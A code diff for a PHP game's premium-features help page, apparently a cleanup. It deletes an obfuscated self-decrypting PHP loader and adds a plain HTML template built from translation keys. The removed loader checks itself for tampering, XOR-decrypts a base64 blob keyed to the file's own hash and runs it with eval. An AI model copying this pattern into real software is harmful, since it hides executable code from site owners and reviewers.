@@ -1,24 +1,130 @@
-<?php
-$jvdmrdwhe="2e2d3daff55f1f8d93a72877f4139432";
-$amedidr="06010000025054055651055603530c570d035656560d07075f50035509025553";
-$dvnhbazmh="TL7nPHy77lUg2SfYTVUhJ10+hY2JLzFcQOduZMRmxiE6WSDwBabtxnhKeenZSmvZ54ZVKvIYXCJkSCuVwQ6Vv6T2rUqvSshm6a/PhHMty8IKNREGNnR2w1UCmgfAyGWbUOlOy4XBUPwzgXa55JQEhovZqBxKLJEsqgx53hE/jiKCpvmrKOZTrFCHAJq/buqIUh9W5JB+fiSVNXQyco+tQQJPxlSmm16nGGMHNaiRwpzxXI4XfjG8DsAlz7ZsUQdkDQEjGvgVmmmAXsjI7ESwElsstm+PYGXuL6dqUh8Pa/5FJOZpaW7qKqAAdNIfsOk+dCrgKBRZGVOvS2oKcevuxi8GgJ5hKr542zeIfrC2sJL8ifZ4hUO9h8nCIYcyHLmqbUHBJAxhV1wrSRYa8XFfmFabw1MqlkFJtGMM6qZA1nkmVHJFgnIuBHvRs0YGB931bfzQ3tOnB9pBwRRbr3vnd41uk6pR+ZsTGi6SmAZhxJ2rjWJ2dHE9/L6d7ie05+IOqHSKZdRAbiiDYFklXKlwIq3i54LUxtrE53Npx/9T580HAkRq81gy4kQqsyRlCHAAxtqhqIltbKaaViJMMlN5hB+2sLU5ic57HXPDSE+58Z0S2psAPzYHckfnCBssdeSmmp9H4FnNbZLRQHL5+1s5WcVsXx61NZxwMwGYK1hjDmVpBU/olWHf1rnn7CjzABLyZOK0BAv3aqBeXuUt+Q0OmY1+JhvmR9dE0IWJ0Qq3vO796Cosk2QBhHRSGGnrn7SivQfp31mcuGuv44KldEKRgvZhDlR94drf7jxRnMZK6YmCxVgghFBR3HJVM/vhsfwmbia7nEvitvZCs8TGqIlNNfE+CYNb5h7DT+G4zmMXnsjsG5dCdQA37AhmiGjgYV0J1ONwkKYmyW4xna5V8sFHdCpmJ2n63oGzno8Niy6O1VUIpSe4E0VOf+u7L7WYe7mxA+PJDsru//WDb0rYqH/4WYOJW8oKXrqGFGc/0ip3Z+3X2ilqIc3QXuLM0hecPOBAseY7EbN8dJfNhOSfRqtKlcKUw3zuVmIVu2TmSpGHFS6+7RQqGUAz5bbHd33ZDdm/nVuyRG2qN7/gQ/RhLN40EfYNdGh1s40mo6pfIBc2kmbvNVVcSLKKvhd7N8uK1Posh8RjPoxXBICXGcMVlKHZIx9+u9o7EI75Q0UR2qJ6sL4Cv/A6n2uoMEtl+/E5PdPF7G/rgomH7DSfT9JLxT1j0JvFEKLHOWxsj1csKe1CgIUL9RD5w8oxlmZKFQ==";
-$jlqrhv=file_get_contents(__FILE__);
-$xpgsrdyo=str_replace($dvnhbazmh,"",$jlqrhv);
-if(strpos($xpgsrdyo,"ec"."ho")!==false||strpos($xpgsrdyo,"pr"."int")!==false||strpos($xpgsrdyo,"var_"."dump")!==false||strpos($xpgsrdyo,"file_put_"."contents")!==false||strpos($xpgsrdyo,"fw"."rite")!==false){die();}
-$fgvtdwb=str_replace(array($jvdmrdwhe,$amedidr),array("SP_7083fc6b","KP_29b9d59a"),$jlqrhv);
-$tuofvcxpd=md5($fgvtdwb);
-$qyxvgap=hex2bin($amedidr);
-$gknlza="";
-$ycvlrcrg=strlen($tuofvcxpd);
-for($qjhbaixlw=0;$qjhbaixlw<$ycvlrcrg;$qjhbaixlw++){
-$gknlza.=chr(ord($qyxvgap[$qjhbaixlw])^ord($tuofvcxpd[$qjhbaixlw]));
-}
-$odclwzwby=base64_decode($dvnhbazmh);
-$cthtxdhoc=strlen($odclwzwby);
-$zgmipzermta="";
-$ynygpnbn=strlen($gknlza);
-for($qjhbaixlw=0;$qjhbaixlw<$cthtxdhoc;$qjhbaixlw++){
-$zgmipzermta.=$odclwzwby[$qjhbaixlw]^$gknlza[$qjhbaixlw%$ynygpnbn];
-}
-$azrnfbyjhv="gzun"."compress";
-eval('?>' . $azrnfbyjhv($zgmipzermta) . '<?php ');
+<h1>
+    <?= __('help.premium.title') ?>
+</h1>
+<p>
+    <?= __('help.premium.intro') ?>
+</p>
+
+<h3>
+    <?= __('help.premium.main_advantages') ?>
+</h3>
+<ul style="list-style-type: square; margin-left: 20px; line-height: 1.5;">
+    <li><b>
+            <?= __('help.premium.build_queue') ?>:
+        </b>
+        <?= __('help.premium.build_queue_desc') ?>
+    </li>
+    <li><b>
+            <?= __('help.premium.quick_bar') ?>:
+        </b>
+        <?= __('help.premium.quick_bar_desc') ?>
+    </li>
+    <li><b>
+            <?= __('help.premium.map_view') ?>:
+        </b>
+        <?= __('help.premium.map_view_desc') ?>
+    </li>
+    <li><b>
+            <?= __('help.premium.village_overview') ?>:
+        </b>
+        <?= __('help.premium.village_overview_desc') ?>
+    </li>
+    <li><b>
+            <?= __('help.premium.map_info') ?>:
+        </b>
+        <?= __('help.premium.map_info_desc') ?>
+    </li>
+    <li><b>
+            <?= __('help.premium.account_manager') ?>:
+        </b>
+        <?= __('help.premium.account_manager_desc') ?>
+    </li>
+</ul>
+
+<br>
+<h3><?= __('help.premium.farm_assistant') ?></h3>
+<p><?= __('help.premium.farm_assistant_intro') ?></p>
+
+<table class="vis" width="100%">
+    <tr>
+        <th><?= __('help.premium.resource') ?></th>
+        <th><?= __('help.premium.description') ?></th>
+    </tr>
+    <tr>
+        <td width="200" align="center">
+            <img src="graphic/new/premium/FarmAssistent_large.webp"
+                style="max-width: 150px; border: 1px solid #7d510f;">
+        </td>
+        <td valign="top">
+            <h4><?= __('help.premium.farm_assistant') ?></h4>
+            <p><?= __('help.premium.farm_assistant_desc') ?></p>
+            <ul>
+                <li><b><?= __('help.premium.recent_reports') ?>:</b> <?= __('help.premium.recent_reports_desc') ?></li>
+                <li><b><?= __('help.premium.buttons_ab') ?>:</b> <?= __('help.premium.buttons_ab_desc') ?></li>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td align="center">
+            <img src="graphic/new/premium/AccountManager_large.webp"
+                style="max-width: 150px; border: 1px solid #7d510f;">
+        </td>
+        <td valign="top">
+            <h4><?= __('help.premium.account_manager') ?></h4>
+            <p><?= __('help.premium.account_manager_intro') ?></p>
+            <ul>
+                <li><b><?= __('help.premium.construction') ?>:</b> <?= __('help.premium.construction_desc') ?></li>
+                <li><b><?= __('help.premium.stock') ?>:</b> <?= __('help.premium.stock_desc') ?></li>
+                <li><b><?= __('help.premium.recruitment') ?>:</b> <?= __('help.premium.recruitment_desc') ?></li>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td align="center">
+            <div style="display: flex; gap: 5px; justify-content: center;">
+                <img src="graphic/new/premium/WoodProduction_large.webp"
+                    style="height: 50px; border: 1px solid #7d510f;">
+                <img src="graphic/new/premium/StoneProduction_large.webp"
+                    style="height: 50px; border: 1px solid #7d510f;">
+                <img src="graphic/new/premium/IronProduction_large.webp"
+                    style="height: 50px; border: 1px solid #7d510f;">
+            </div>
+        </td>
+        <td valign="top">
+            <h4><?= __('help.premium.production_bonus') ?></h4>
+            <p><?= __('help.premium.production_bonus_desc') ?></p>
+            <ul>
+                <li><b><?= __('help.premium.wood_bonus') ?></b></li>
+                <li><b><?= __('help.premium.clay_bonus') ?></b></li>
+                <li><b><?= __('help.premium.iron_bonus') ?></b></li>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td align="center">
+            <!--<img src="graphic/new/premium/product_01.png" style="max-width: 150px; border: 1px solid #7d510f;">-->
+            <img src="graphic/new/premium/name/effect/name_effect_orange.webp"
+                style="height: 40px; border: 1px solid #7d510f;">
+            <img src="graphic/new/premium/name/color/name_effect_red.webp"
+                style="height: 40px; border: 1px solid #7d510f;">
+            <img src="graphic/new/premium/name/village/skins_orange.webp"
+                style="height: 40px; border: 1px solid #7d510f;">
+            <img src="graphic/new/throbber.gif" style="height: 40px; border: 1px solid #7d510f;">
+        </td>
+        <td valign="top">
+            <h4><?= __('help.premium.cosmetics') ?></h4>
+            <p><?= __('help.premium.cosmetics_desc') ?></p>
+            <ul>
+                <li><b><?= __('help.premium.graphic_packs') ?>:</b> <?= __('help.premium.graphic_packs_desc') ?> <b><?= __('help.premium.animated') ?>:</b><img
+                        src="graphic/new/premium/name/effect/name_effect_orange.webp"
+                        style="height: 25px; border: 1px solid #7d510f;"> <b><?= __('help.premium.colorful') ?>:</b><img
+                        src="graphic/new/premium/name/color/name_effect_red.webp"
+                        style="height: 25px; border: 1px solid #7d510f;"> </li>
+                <li><b><?= __('help.premium.village_skins') ?>:</b> <?= __('help.premium.village_skins_desc') ?>
+                    <b><?= __('help.premium.example') ?>:</b><img src="graphic/new/premium/villages/blue/banner_blue_v5.png"
+                        style="height: 25px; border: 1px solid #7d510f;" </li>
+                <li><b><?= __('help.premium.coats_of_arms') ?>:</b> <?= __('help.premium.coats_of_arms_desc') ?></li>
+            </ul>
+        </td>
+    </tr>
+</table>
